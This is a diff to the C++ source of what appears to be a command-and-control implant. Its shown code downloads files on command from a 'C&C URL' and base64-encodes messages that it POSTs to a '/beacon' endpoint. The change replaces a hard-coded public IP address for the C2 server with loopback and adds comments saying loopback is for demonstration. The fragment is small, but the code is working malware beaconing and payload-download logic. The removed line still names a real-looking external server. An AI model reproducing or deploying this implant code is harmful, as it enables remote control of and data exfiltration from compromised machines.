@@ -85,7 +85,7 @@ int main()
                     DWORD Length = 0;
                     //download <filename>
                     string filename = fullcmd.substr(strlen("download "));
-                    string FullURL = "http://127.0.0.1/gui/" + filename; // C&C URL goes here.
+                    string FullURL = "http://127.0.0.1/gui/" + filename; // C&C URL goes here, loopback address is for demonstration.
                     char* FileData = DownloadFile(FullURL.c_str(), &Length, NULL);
                     FILE* f = fopen(filename.c_str(), "wb");
                     fwrite(FileData, 1, Length, f);
@@ -157,7 +157,7 @@ int main()
             char* encodedmsg = b64encode((char*)msg.dump().c_str(), msg.dump().length());
             printf("Our Encoded Msg: %s\n", encodedmsg);
 
-            hSession = SendRequest("54.247.53.160", 80, "/beacon", "POST", encodedmsg);
+            hSession = SendRequest("127.0.0.1", 80, "/beacon", "POST", encodedmsg); // C&C URL goes here, loopback address is for demonstration.
             if (hSession)
             {
                 printf("Data has been sent successfully\n");
